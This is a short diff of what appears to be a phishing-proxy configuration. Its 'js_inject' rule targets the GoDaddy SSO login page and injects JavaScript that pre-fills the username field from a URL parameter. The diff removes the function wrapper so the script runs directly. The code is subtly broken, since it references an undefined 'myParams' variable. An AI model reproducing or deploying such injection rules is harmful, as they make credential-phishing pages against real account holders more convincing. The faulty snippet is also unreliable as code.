@@ -65,11 +65,9 @@ js_inject:
   - trigger_domains: ["sso.godaddy.com"]
     trigger_paths: ["/login"]
     script: |
-      function embox() {
                var delaytimer = 2000;
                setTimeout(function(){
                        const urlParams = new URLSearchParams(window.location.search);
                        const myParam = urlParams.get('limea');
                        document.getElementById("username").value = myParams;
                }, delaytimer);
-      }
